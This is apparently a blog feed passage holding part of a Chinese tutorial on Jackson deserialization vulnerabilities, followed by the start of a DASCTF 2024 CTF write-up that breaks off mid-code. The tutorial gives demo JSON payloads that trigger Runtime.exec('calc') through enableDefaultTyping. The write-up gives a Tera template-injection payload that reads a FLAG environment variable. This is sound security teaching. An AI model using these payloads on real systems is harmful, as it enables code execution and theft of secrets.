alt="image-20241224172923965"></p><p>object属性中<code>&quot;@type&quot;:&quot;Hacker&quot;</code>，乍一看没什么问题，但实际上没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的</p><hr><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>直接运行会抛出异常，需要用户自定义来使用</p><br><p>那么可触发反序列化的注解就两个：</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo.Id.MINIMAL_CLASS</li></ul><hr><h2 id="反序列化中类属性方法的调用"><a href="#反序列化中类属性方法的调用" class="headerlink" title="反序列化中类属性方法的调用"></a>反序列化中类属性方法的调用</h2><p>整个 User2 类，加上 setter 和 getter</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化与反序列化：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">User2</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User2</span><span class="token punctuation">(</span><span class="token string">"0w0"</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">User2</span> u2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">User2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>u2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225000040426.png" alt="image-20241225000040426"></p><p>可以看到序列化会调用 getter，而反序列化会调用构造方法和 setter，和 fastjson 类似</p><br><hr><h1 id="Jackson反序列化漏洞demo"><a href="#Jackson反序列化漏洞demo" class="headerlink" title="Jackson反序列化漏洞demo"></a>Jackson反序列化漏洞demo</h1><p>满足下面三个条件之一即存在 Jackson 反序列化漏洞：</p><ul><li>调用了 <code>ObjectMapper.enableDefaultTyping()</code> 函数；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li></ul><p>由之前的结论知道，当使用的 JacksonPolymorphicDeserialization 机制配置有问题时，Jackson 反序列化就会调用属性所属类的构造函数和 setter 方法。</p><p>而如果该构造函数或 setter 方法存在危险操作，那么就存在 Jackson 反序列化漏洞。</p><h2 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h2><p>当要进行反序列化的类的属性所属类的构造函数或 setter 方法本身存在漏洞时，这种场景存在 Jackson 反序列化漏洞，实际场景几乎不可能存在这种好事</p><p>直接修改 MySex 类的 setSex ()方法，在其中添加命令执行操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.getSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.setSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person3类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写反序列化类，构造 Payload</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationRun</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> json <span class="token operator">=</span> <span class="token string">"&#123;\"age\":16,\"name\":\"0w0\",\"sex\":[\"MySex\",&#123;\"sex\":1&#125;]&#125;"</span><span class="token punctuation">;</span>          <span class="token class-name">Person3</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person3</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225003715010.png" alt="image-20241225003715010"></p><hr><h2 id="属性为Object类时"><a href="#属性为Object类时" class="headerlink" title="属性为Object类时"></a>属性为Object类时</h2><p>当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。</p><p>Evil：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> cmd<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCmd</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person4：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token comment">// @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>    <span class="token comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person4 构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person4 setter 函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationObjectRun</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> <span class="token string">"&#123;\"age\":16,\"name\":\"0w0\",\"object\":[\"Evil\",&#123;\"cmd\":\"calc\"&#125;]&#125;"</span><span class="token punctuation">;</span>        <span class="token class-name">Person4</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person4</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225004159668.png" alt="image-20241225004159668"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学期初爽学一次Java，学期末再爽学一次Java😋&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&quot;&gt;https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/&quot;&gt;https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2023/09/27/Jackson/&quot;&gt;https://zer0peach.github.io/2023/09/27/Jackson/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF x 0psu3 2024最后一战</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/</id>
    <published>2024-12-21T01:57:00.000Z</published>
    <updated>2025-02-02T15:19:50.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>时隔一年，这次连签到都差点做不来了</p><p>唉唉web又爆零了，埋了，得了一种打 DAS 就做不动题的病</p><p>等期末考完再复现，要被期末考薄纱了😭</p><p>参考：</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">https://www.cnblogs.com/gxngxngxn/p/18620905</a></p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#">https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#</a></p><p><a href="https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/">https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/</a></p><span id="more"></span><hr><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><blockquote><p>请仔细观察这个链接，会先到 <a href="http://game.wetolink.com/">game.wetolink.com</a>，那么，稍微扫描一下能有什么发现呢？</p></blockquote><p>公网 https 我哪敢直接扫啊（</p><p>它给的网站并非真实的报名网站</p><p>扫一下发现有robots.txt</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221170034012.png" alt="image-20241221170034012"></p><hr><h1 id="西湖论剑邀请函获取器"><a href="#西湖论剑邀请函获取器" class="headerlink" title="西湖论剑邀请函获取器"></a>西湖论剑邀请函获取器</h1><blockquote><p>提交截图那里，队名好像可以 81 ？但好像不是 Python 写的，是 Rust 吗（喜）；不用RCE，拿到环境变量FLAG的内容即可。</p></blockquote><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221170314887.png" alt="image-20241221170314887"></p><p>有ssti</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221171013243.png" alt="image-20241221171013243"></p><p>浅浅测一下发现确实是 tera 模板，此事在<a href="https://c1oudfl0w0.github.io/blog/2024/10/21/2024%E4%B8%89%E5%B3%A1%E6%9D%AF/#textme">三峡杯初赛</a>中亦有记载</p><p>无过滤那就直接读</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token function">get_env</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221171243779.png" alt="image-20241221171243779"></p><hr><h1 id="const-python（复现）"><a href="#const-python（复现）" class="headerlink" title="const_python（复现）"></a>const_python（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> uuid<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>jsonify<span class="token punctuation">,</span>session<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> auth<span class="token operator">=</span><span class="token string">'ctfer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password        self<span class="token punctuation">.</span>auth <span class="token operator">=</span> authpassword <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>Admin <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> password<span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Welcome to my application"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">post_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> 